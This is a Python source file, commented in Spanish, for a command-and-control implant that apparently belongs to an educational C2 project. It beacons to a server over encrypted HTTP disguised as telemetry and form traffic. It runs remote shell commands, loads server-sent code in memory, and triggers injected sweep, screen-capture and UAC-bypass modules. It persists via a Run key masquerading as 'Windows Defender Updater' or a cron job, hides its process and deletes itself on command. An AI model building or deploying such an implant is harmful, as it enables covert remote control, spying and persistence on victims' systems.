"""
╔══════════════════════════════════════════════════════════════╗
║        C2 AGENT v2 - ARQUITECTURA HTTP & FILELESS            ║
╚══════════════════════════════════════════════════════════════╝

Características V2:
- Beacons vía HTTP GET (Poll) y HTTP POST (Responses).
- Jittering (retrasos aleatorios de sleep).
- Carga de módulos en memoria (Fileless / Reflective Execution).
- Malleable C2 HTTP Profiles.
"""

import urllib.request
import urllib.parse
import json
import base64
import os
import sys
import platform
import random
import time
import threading
import subprocess

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
    import hashlib
    AES_AVAILABLE = True
except ImportError:
    AES_AVAILABLE = False

# =========================================================
# CONFIGURACIÓN DEL IMPLANTE
# =========================================================
C2_URL = "http://127.0.0.1:4444"
AES_KEY = b'C2ProjectEduKey2024!SecureKey32b'
BEACON_INTERVAL = 5   # Segundos base entre cada check-in
JITTER = 0.3          # 30% de variación aleatoria de tiempo

class AESCipher:
    def __init__(self, key: bytes = AES_KEY):
        if AES_AVAILABLE:
            self.key = hashlib.sha256(key).digest() if len(key) != 32 else key
            
    def encrypt(self, plaintext: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in plaintext])
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        return base64.b64encode(iv + ciphertext)
    
    def decrypt(self, encrypted_data: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in encrypted_data])
        raw = base64.b64decode(encrypted_data)
        cipher = AES.new(self.key, AES.MODE_CBC, raw[:16])
        return unpad(cipher.decrypt(raw[16:]), AES.block_size)

class AgentV2:
    def __init__(self):
        self.aes = AESCipher()
        self.agent_id = self._generate_id()
        self.cwd = os.getcwd()
        self.running = True
        self.beacon_interval = BEACON_INTERVAL
        self.jitter = JITTER
        
        # Módulos inyectados en memoria
        self.injected_modules = {}

    def _generate_id(self):
        return base64.b64encode(os.urandom(6)).decode('utf-8')

    def build_sysinfo(self):
        return {
            'id': self.agent_id,
            'hostname': platform.node(),
            'os': f"{platform.system()} {platform.release()}",
            'username': os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            'cwd': self.cwd
        }
        
    def encode_payload(self, data: dict) -> str:
        json_data = json.dumps(data).encode('utf-8')
        return self.aes.encrypt(json_data).decode('utf-8')

    def decode_payload(self, b64_encoded: str) -> dict:
        try:
            decrypted = self.aes.decrypt(b64_encoded)
            return json.loads(decrypted.decode('utf-8'))
        except Exception as e:
            return {'error': str(e)}

    def check_in(self):
        """Malleable GET: Emula telemetría web. Mete la ID en la Cookie para evadir"""
        safe_id = urllib.parse.quote(self.agent_id)
        # Disfrazamos la URL pareciendo un ping inofensivo a una API
        url = f"{C2_URL}/api/v2/telemetry"
        
        # Inyectamos el ID disfrazado en la cabecera Cookie
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Cookie': f'session_id={safe_id}'
        }
        
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=10) as response:
                content = response.read()
                if content:
                    payload = self.decode_payload(content)
                    if 'command' in payload:
                        self.process_command(payload)
        except Exception:
            pass

    def send_response(self, task_id: str, data: dict):
        """Malleable POST: Envía respuestas ocultas en campos de formulario o cookies falsas"""
        url = f"{C2_URL}/api/v2/update"
        data['id'] = self.agent_id
        data['task_id'] = task_id
        
        payload_str = self.encode_payload(data)
        # Armamos un Payload Malleable que parece información basura
        post_data = urllib.parse.urlencode({'__VIEWSTATE': payload_str}).encode('utf-8')
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': f'session_id={urllib.parse.quote(self.agent_id)}'
        }
        
        try:
            req = urllib.request.Request(url, data=post_data, headers=headers)
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass

    def evaluate_in_memory(self, code_str: str, module_name: str):
        """Inyecta y compila código crudo dentro del contexto de memoria del Agente"""
        try:
            compiled_code = compile(code_str, '<string>', 'exec')
            module_globals = {}
            exec(compiled_code, module_globals)
            self.injected_modules[module_name] = module_globals
            return True
        except Exception as e:
            return str(e)

    def process_command(self, payload: dict):
        cmd_str = payload.get('command', '')
        task_id = payload.get('task_id', '0000')
        args = payload.get('args', '')
        
        # Evaluar carga fileless
        if 'fileless_script' in payload:
            script_content = payload['fileless_script']
            mod_name = args 
            res = self.evaluate_in_memory(script_content, mod_name)
            if res is True:
                self.send_response(task_id, {'output': f'[+] Módulo {mod_name} cargado estáticamente en memoria RAM.'})
            else:
                self.send_response(task_id, {'error': f'[-] Error inyectando módulo: {res}'})
            return

        # Comandos Nativos
        if cmd_str == 'register':
            self.send_response(task_id, {'info': self.build_sysinfo()})
            
        elif cmd_str == 'shell':
            try:
                res = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
                out = res.stdout + res.stderr
                self.send_response(task_id, {'output': out if out else '[Command executed]'})
            except Exception as e:
                self.send_response(task_id, {'error': str(e)})
                
        elif cmd_str == 'sweep':
            if 'network_sweeper' in self.injected_modules:
                try:
                    sweeper_run = self.injected_modules['network_sweeper'].get('run_sweep')
                    if sweeper_run:
                        out = sweeper_run(args)
                        self.send_response(task_id, {'output': out})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                self.send_response(task_id, {'error': 'El módulo network_sweeper no está inyectado en RAM. Inyéctalo primero.'})
                
        elif cmd_str == 'watch':
            if 'stream_capture' in self.injected_modules:
                try:
                    capture_fn = self.injected_modules['stream_capture'].get('capture_frame')
                    if capture_fn:
                        out = capture_fn(args)
                        if "error" in out:
                            self.send_response(task_id, {'error': out["error"]})
                        else:
                            self.send_response(task_id, {'vision_frame': out["data"], 'target': args})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                self.send_response(task_id, {'error': 'El módulo stream_capture no está inyectado en RAM. Inyéctalo primero.'})

        elif cmd_str == 'elevate':
            if 'uac_bypass' in self.injected_modules:
                try:
                    bypass_fn = self.injected_modules['uac_bypass'].get('run_uac_bypass')
                    if bypass_fn:
                        out = bypass_fn()
                        self.send_response(task_id, {'output': out})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                self.send_response(task_id, {'error': 'El módulo uac_bypass no está inyectado en RAM. Inyéctalo primero.'})
                
        elif cmd_str == 'persist':
            target_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            if platform.system() == 'Windows':
                try:
                    import winreg
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "Windows Defender Updater", 0, winreg.REG_SZ, f'"{target_exe}"')
                    winreg.CloseKey(key)
                    self.send_response(task_id, {'output': '[+] Clave de registro creada exitosamente. (Persistencia Windows)'})
                except Exception as e:
                    self.send_response(task_id, {'error': f'[-] No se pudo establecer persistencia: {str(e)}'})
            else:
                try:
                    cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot {target_exe}") | crontab -'
                    os.system(cron_cmd)
                    self.send_response(task_id, {'output': '[+] Cronjob inyectado existosamente. (Persistencia Linux @reboot)'})
                except Exception as e:
                    self.send_response(task_id, {'error': f'[-] Error configurando el Cronjob: {e}'})
                
        elif cmd_str == 'sleep':
            try:
                parts = args.split()
                if len(parts) >= 1:
                    self.beacon_interval = float(parts[0])
                if len(parts) >= 2:
                    self.jitter = float(parts[1])
                self.send_response(task_id, {'output': f'[+] Tiempos actualizados: Sleep={self.beacon_interval}s, Jitter={self.jitter}'})
            except Exception as e:
                self.send_response(task_id, {'error': f'[-] Error ajustando sleep: {e}'})
                
        elif cmd_str == 'kill':
            self.send_response(task_id, {'output': '[+] Ejecutando orden de auto-destrucción...'})
            self.running = False
            # Limpiar persistencia si existe (Windows)
            if platform.system() == 'Windows':
                try:
                    import winreg
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, "Windows Defender Updater")
                    winreg.CloseKey(key)
                except Exception:
                    pass
                    
            # Si corre como script, nos borramos a nosotros mismos
            script_path = os.path.abspath(__file__)
            if not getattr(sys, 'frozen', False):
                try:
                    # Cmd en background para borrar el archivo actual tras 2 segundos
                    os.system(f'start /b cmd /c ping 127.0.0.1 -n 3 > nul & del "{script_path}"')
                except:
                    pass
            sys.exit(0)
                
        else:
            self.send_response(task_id, {'error': 'Comando desconocido por agent_v2'})

    def run(self):
        # Registro inicial
        self.send_response('register', {'info': self.build_sysinfo()})
        print(f"[*] Agent {self.agent_id} initialized with Beacons.")
        
        while self.running:
            self.check_in()
            sleep_time = self.beacon_interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(sleep_time)

if __name__ == '__main__':
    # Evasión Rootkit: Daemonizar el proceso en Linux ocultándolo del usuario
    if platform.system() != 'Windows':
        import os
        try:
            if os.fork() > 0:
                sys.exit(0) # El proceso padre muere, el hijo queda residente en RAM
        except OSError:
            pass
        
        # Eliminar cualquier output por pantalla redirigiendo a /dev/null
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
        
    agent = AgentV2()
    agent.run()
